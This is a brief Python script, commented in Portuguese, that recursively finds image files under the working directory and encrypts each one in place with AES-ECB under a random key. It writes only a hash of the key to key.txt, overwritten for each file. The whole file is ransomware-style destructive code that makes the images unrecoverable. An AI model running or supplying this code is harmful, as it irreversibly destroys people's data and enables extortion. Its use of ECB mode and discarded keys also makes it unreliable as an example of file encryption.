import os
import hashlib
from Crypto.Cipher import AES
from Crypto.Util import Padding

def encrypt_file(file_path):
    # gera uma chave aleatória
    key = os.urandom(32)

    # cria o objeto AES
    cipher = AES.new(key, AES.MODE_ECB)

    # lê o conteúdo do arquivo
    with open(file_path, 'rb') as file:
        plaintext = file.read()

    # adiciona padding
    plaintext = Padding.pad(plaintext, AES.block_size)

    # criptografa o conteúdo do arquivo
    ciphertext = cipher.encrypt(plaintext)

    # salva o conteúdo criptografado no arquivo
    with open(file_path, 'wb') as file:
        file.write(ciphertext)

    # retorna a chave
    return key

def encrypt_files():
    # procura por arquivos no diretório atual
    for dir_name, subdirs, files in os.walk(os.getcwd()):
        for file_name in files:
            # constrói o caminho completo do arquivo
            file_path = os.path.join(dir_name, file_name)

            # verifica se o arquivo é uma imagem
            if file_path.endswith(('.jpg', '.jpeg', '.png', '.bmp', '.gif')):
                # criptografa o arquivo
                key = encrypt_file(file_path)

                # gera o hash da chave
                key_hash = hashlib.sha256(key).hexdigest()

                # salva o hash da chave em um arquivo
                with open('key.txt', 'w') as file:
                    file.write(key_hash)

if __name__ == '__main__':
    encrypt_files()
